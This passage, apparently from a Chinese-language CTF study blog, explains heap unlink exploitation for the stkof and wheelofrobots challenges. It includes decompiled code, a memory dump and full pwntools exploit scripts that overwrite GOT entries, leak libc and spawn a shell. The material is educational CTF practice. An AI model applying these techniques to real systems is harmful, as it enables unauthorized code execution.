&apos;sys_adr: &apos;+hex(sys_adr)</span><br><span class="line">print &apos;binsh_adr: &apos;+hex(binsh_adr)</span><br><span class="line">editnote(0,p64(sys_adr)[:-1])</span><br><span class="line">editnote(3,p64(binsh_adr)[:-1]) #作为chunk0,即free的参数</span><br><span class="line">delnote(0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>学到的新技能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p64(puts_plt)[:-1]  # 解决了只能包含“\n”只能发送八个字节的问题</span><br></pre></td></tr></table></figure>

<h2 id="2014-hitcon-stkof"><a href="#2014-hitcon-stkof" class="headerlink" title="2014 hitcon stkof"></a>2014 hitcon stkof</h2><p>这题我一直绕的点在，target为什么要是chunk0+0x10，即chunk2的位置<br>在测试中，我们可以发现其实chunk1和chunk2之间是隔了0x400的，但chunk2和chunk3是相邻的<br>我们需要在chunk2中操作unlink，所以我们需要是chunk2 –&gt;fack_chunk(chunk2-0x18),所以target改为chunk2地址所在的位置（在何位置构造，指针则指向哪里）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"> </span><br><span class="line">from pwn import*</span><br><span class="line"> </span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line"> </span><br><span class="line">sh = process(&quot;./stkof&quot;)</span><br><span class="line">elf = ELF(&quot;./stkof&quot;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"> </span><br><span class="line">def add(size):</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"> </span><br><span class="line">def delete(idx):</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line">def edit(idx,strings):</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.sendline(str(len(strings)))</span><br><span class="line">    sh.send(strings)</span><br><span class="line">    sh.recvuntil(&quot;OK\n&quot;)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[&apos;free&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts_plt = elf.sym[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x80) #1</span><br><span class="line">add(0x80) #2</span><br><span class="line">add(0x80) #3</span><br><span class="line"></span><br><span class="line">target = 0x602140 + 0x10</span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target - 0x10</span><br><span class="line"></span><br><span class="line">payload = p64(0)+p64(0x81)</span><br><span class="line">payload += p64(fd) +p64(bk)</span><br><span class="line">payload += &apos;a&apos;*0x60</span><br><span class="line">payload += p64(0x80)+p64(0x90)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">edit(2,payload)  #在chunk2的地方修改，则要使fack指向全局指针存放chunk2处的地址，而非chunk0</span><br><span class="line">delete(3)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;OK&quot;)</span><br><span class="line">payload = &apos;a&apos;*0x8 + p64(free_got) + p64(puts_got)</span><br><span class="line"></span><br><span class="line">edit(2,payload)</span><br><span class="line">edit(0,p64(puts_plt))</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">puts_addr = u64(sh.recvuntil(&apos;\nOK\n&apos;, drop=True).ljust(8, &apos;\x00&apos;))</span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line">print hex(puts_addr)</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0xf1147</span><br><span class="line"></span><br><span class="line">edit(0,p64(onegadget))</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2017-wheelofrobots"><a href="#2017-wheelofrobots" class="headerlink" title="2017 wheelofrobots"></a>2017 wheelofrobots</h2><p>这道题太混乱了，好复杂的一个程序啊，我看了老半天才稍微看懂这个程序是干嘛的</p>
<p>洞的话第一个应该是add里面choose之后输入那里</p>
<p>off by one</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sub_400D83(&quot;Which robot do you want to add to the wheel?&quot;);</span><br><span class="line">printf(&quot;Your choice :&quot;);</span><br><span class="line">memset(&amp;unk_603110, 0, 4uLL);</span><br><span class="line">v10 = sub_400A36(&amp;unk_603110, 5LL);   //可以多一个字节溢出，覆盖的地址在0x603114的内容</span><br><span class="line"></span><br><span class="line">而0x603114刚好是存放第二个robot状态的地址</span><br><span class="line"> case 2:</span><br><span class="line">        if ( !dword_603114 )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Increase Bender&apos;s intelligence: &quot;, 5LL);</span><br><span class="line">          memset(&amp;s, 0, 5uLL);</span><br><span class="line">          v8 = sub_400A36(&amp;s, 5LL);</span><br><span class="line">          if ( v8 &gt; 4 )</span><br><span class="line">          &#123;</span><br><span class="line">            puts(&quot;Sorry impossible to make bender as smart!&quot;);</span><br><span class="line">            v8 = 2;</span><br><span class="line">          &#125;</span><br><span class="line">          qword_6030F0 = calloc(1uLL, 20 * v8);</span><br><span class="line">          qword_603138 = v8;</span><br><span class="line">          dword_603114 = 1;</span><br><span class="line">          v1 = qword_6030F0;</span><br><span class="line">          *(_DWORD *)qword_6030F0 = &apos;dneB&apos;;</span><br><span class="line">          v1[2] = &apos;re&apos;;</span><br><span class="line">          *((_BYTE *)v1 + 6) = 0;</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br></pre></td></tr></table></figure>

<p>我们可以通过更改bender的状态做到不add直接change<br>然后我们可以发现这几个robots之间错综复杂的关系，就可以构造face_chunk,实现unlink</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">case 1u:</span><br><span class="line">      result = (unsigned int)dword_603120;</span><br><span class="line">      if ( dword_603120 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Robot&apos;s name: &quot;);</span><br><span class="line">        result = read(0, buf, 0x14uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      break;</span><br><span class="line">      </span><br><span class="line">.bss:00000000006030F8 ; void *buf</span><br><span class="line">.bss:00000000006030F8 buf             dq ?                    ; DATA XREF: sub_400DF8+A6↑w</span><br><span class="line">.bss:00000000006030F8                                         ; sub_400DF8+B7↑r ...      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">case 6u:</span><br><span class="line">      result = (unsigned int)dword_60311C;</span><br><span class="line">      if ( dword_60311C )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Robot&apos;s name: &quot;);</span><br><span class="line">        result = read(0, qword_6030E8, 20 * qword_603148);</span><br><span class="line">      &#125;</span><br><span class="line">      break;</span><br></pre></td></tr></table></figure>

<p>我们知道如果在tinny处改size就可以覆盖destruction的内容，构造unlink，先在bss段构造fack_chunk，使原本指向tinny，即chunk1的指针，指向0x603148处，之后对chunk1的所有操作都在这个地址处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x6030e0</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030f0:	0x0000000001021010	0x0000000000603148 -&gt;tinny point to 0x603148</span><br><span class="line">0x603100:	0x0000000001021030	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000100000a31	0x0000000000000000</span><br><span class="line">0x603120:	0x0000000100000001	0x0000000000000000</span><br><span class="line">0x603130:	0x0000000000000003	0x0000000000000001</span><br><span class="line">0x603140:	0x0000000000000020 -&gt; fack_chunk	0x695420796e6e6954</span><br><span class="line">0x603150:	0x000000000000006d	0x0000000000000000</span><br><span class="line">0x603160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>利用chunk1和chunk6的关系，在chunk6上构造unlink，使unlink到0x6030e8-0x18处，就可以覆写该存放chunk地址为自己想改写的东西。</p>
<p>wiki具体exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">if args[&apos;DEBUG&apos;]:</span><br><span class="line">    context.log_level = &apos;debug&apos;</span><br><span class="line">context.binary = &quot;./wheelofrobots&quot;</span><br><span class="line">robots = ELF(&apos;./wheelofrobots&apos;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    p = remote(&apos;127.0.0.1&apos;, 7777)</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./wheelofrobots&quot;)</span><br><span class="line">log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def offset_bin_main_arena(idx):</span><br><span class="line">    word_bytes = context.word_size / 8</span><br><span class="line">    offset = 4  # lock</span><br><span class="line">    offset += 4  # flags</span><br><span class="line">    offset += word_bytes * 10  # offset fastbin</span><br><span class="line">    offset += word_bytes * 2  # top,last_remainder</span><br><span class="line">    offset += idx * 2 * word_bytes  # idx</span><br><span class="line">    offset -= word_bytes * 2  # bin overlap</span><br><span class="line">    return offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx, size=0):</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    if idx == 2:</span><br><span class="line">        p.recvuntil(&quot;Increase Bender&apos;s intelligence: &quot;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    elif idx == 3:</span><br><span class="line">        p.recvuntil(&quot;Increase Robot Devil&apos;s cruelty: &quot;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    elif idx == 6:</span><br><span class="line">        p.recvuntil(&quot;Increase Destructor&apos;s powerful: &quot;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def change(idx, name):</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;Robot&apos;s name: \n&quot;)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_robot():</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def overflow_benderinuse(inuse):</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.send(&apos;9999&apos; + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write(where, what):</span><br><span class="line">    change(1, p64(where))</span><br><span class="line">    change(6, p64(what))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    print &quot;step 1&quot;</span><br><span class="line">    # add a fastbin chunk 0x20 and free it</span><br><span class="line">    # so it is in fastbin, idx2-&gt;NULL</span><br><span class="line">    add(2, 1)  # idx2</span><br><span class="line">    remove(2)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    # overflow bender inuse with 1</span><br><span class="line">    overflow_benderinuse(&apos;\x01&apos;)</span><br><span class="line">    # change bender&apos;s fd to 0x603138, point to bender&apos;s size</span><br><span class="line">    # now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span><br><span class="line">    change(2, p64(0x603138))</span><br><span class="line">    # in order add bender again</span><br><span class="line">    overflow_benderinuse(&apos;\x00&apos;)</span><br><span class="line">    # add bender again, fastbin 0x603138-&gt;NULL</span><br><span class="line">    add(2, 1)</span><br><span class="line">    # in order to malloc chunk at 0x603138</span><br><span class="line">    # we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span><br><span class="line">    # it is at Robot Devil</span><br><span class="line">    add(3, 0x20) #构造个size，使add tinny的时候指向0x603148，同时把它写进0x3060f8</span><br><span class="line">    # trigger malloc, set tinny point to 0x603148</span><br><span class="line">    add(1)</span><br><span class="line">    # wheels must &lt;= 3</span><br><span class="line">    remove(2)</span><br><span class="line">    remove(3)</span><br><span class="line"></span><br><span class="line">    print &apos;step 2&apos;</span><br><span class="line">    # alloc Destructor size 60-&gt;0x50, chunk content 0x40</span><br><span class="line">    add(6, 3)</span><br><span class="line">    # alloc devil, size=20*7=140, bigger than fastbin</span><br><span class="line">    add(3, 7)</span><br><span class="line">    # edit destructor&apos;s size to 1000 by tinny</span><br><span class="line">    change(1, p64(1000))</span><br><span class="line">    # place fake chunk at destructor&apos;s pointer</span><br><span class="line">    fakechunk_addr = 0x6030E8</span><br><span class="line">    fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(fakechunk_addr - 0x10) + p64(0x20)</span><br><span class="line">    fakechunk = fakechunk.ljust(0x40, &apos;a&apos;)</span><br><span class="line">    fakechunk += p64(0x40) + p64(0xa0)</span><br><span class="line">    change(6, fakechunk) #写在heap里</span><br><span class="line">    # trigger unlink</span><br><span class="line">    remove(3)</span><br><span class="line"></span><br><span class="line">    print &apos;step 3&apos;</span><br><span class="line">    # make 0x6030F8 point to 0x6030E8</span><br><span class="line">    payload = p64(0) * 2 + 0x18 * &apos;a&apos; + p64(0x6030E8)</span><br><span class="line">    change(6, payload)</span><br><span class="line"></span><br><span class="line">    print &apos;step 4&apos;</span><br><span class="line">    # make exit just as return</span><br><span class="line">    write(robots.got[&apos;exit&apos;], 0x401954)</span><br><span class="line"></span><br><span class="line">    print &apos;step 5&apos;</span><br><span class="line">    # set wheel cnt =3, 0x603130 in order to start robot</span><br><span class="line">    write(0x603130, 3)</span><br><span class="line">    # set destructor point to puts@got</span><br><span class="line">    change(1, p64(robots.got[&apos;puts&apos;]))</span><br><span class="line">    start_robot() #start chunk1，即puts</span><br><span class="line">    p.recvuntil(&apos;New hands great!! Thx &apos;)</span><br><span class="line">    puts_addr = p.recvuntil(&apos;!\n&apos;, drop=True).ljust(8, &apos;\x00&apos;)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(&apos;puts addr: &apos; + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">    log.success(&apos;libc base: &apos; + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line"></span><br><span class="line">    # make free-&gt;system</span><br><span class="line">    write(robots.got[&apos;free&apos;], system_addr)</span><br><span class="line">    # make destructor point to /bin/sh addr</span><br><span class="line">    write(0x6030E8, binsh_addr)</span><br><span class="line">    # get shell</span><br><span class="line">    remove(6)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>emmm这种方法在start robots那里我就很懵，简便一点的话就换一种方法来leak，直接覆写chunk1和chunk2，通过改free的got表来实现<br>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"> </span><br><span class="line">from pwn import*</span><br><span class="line"> </span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">elf = ELF(&apos;./wheelofrobots&apos;)</span><br><span class="line">p = process(&quot;./wheelofrobots&quot;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def add(idx, size=0):</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    if idx == 2:</span><br><span class="line">        p.recvuntil(&quot;Increase Bender&apos;s intelligence: &quot;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    elif idx == 3:</span><br><span class="line">        p.recvuntil(&quot;Increase Robot Devil&apos;s cruelty: &quot;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line">    elif idx == 6:</span><br><span class="line">        p.recvuntil(&quot;Increase Destructor&apos;s powerful: &quot;)</span><br><span class="line">        p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def change(idx, name):</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;Robot&apos;s name: \n&quot;)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_robot():</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def overflow_benderinuse(inuse):</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    p.send(&apos;9999&apos; + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write(where, what):</span><br><span class="line">    change(1, p64(where))</span><br><span class="line">    change(6, p64(what))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(2,1)</span><br><span class="line">remove(2)</span><br><span class="line">overflow_benderinuse(&apos;\x01&apos;)</span><br><span class="line">change(2,p64(0x603138))</span><br><span class="line">overflow_benderinuse(&apos;\x00&apos;)</span><br><span class="line">add(2,1)</span><br><span class="line">add(3,0x20)</span><br><span class="line">add(1)</span><br><span class="line">remove(2)</span><br><span class="line">remove(3)</span><br><span class="line"></span><br><span class="line">add(6,3) #60-&gt;0x40</span><br><span class="line">add(3,7) #140-&gt;0x90</span><br><span class="line">change(1,p64(1000)) #改大小方便填写payload</span><br><span class="line">target = 0x6030e8</span><br><span class="line">fd = target-0x18</span><br><span class="line">bk = target-0x10</span><br><span class="line">pay = p64(0)+p64(0x40)+p64(fd) + p64(bk) +&apos;a&apos;*0x20+p64(0x40)+p64(0xa0)</span><br><span class="line"></span><br><span class="line">change(6,pay)</span><br><span class="line">remove(3) #unlink</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">add(2,1)</span><br><span class="line">pay = &apos;a&apos;*0x18 +p64(elf.got[&apos;free&apos;])+p64(elf.got[&apos;puts&apos;])</span><br><span class="line">change(6,pay)</span><br><span class="line">pay = p64(elf.plt[&apos;puts&apos;])</span><br><span class="line">change(6,pay)</span><br><span class="line">remove(2)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">change(6,p64(system))</span><br><span class="line">change(1,&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>参考链接：<br><a href="https://www.jianshu.com/p/b5ce1e4aee6a" target="_blank" rel="noopener">https://www.jianshu.com/p/b5ce1e4aee6a</a><br><a href="https://gdufs-king.github.io/2020/01/03/unlink%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">https://gdufs-king.github.io/2020/01/03/unlink%E5%88%9D%E6%8E%A2/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/18/unlink/" data-id="ck6swyptu000c5wswt3cyqgbo"
         class="article-share-link">Share</a>
      
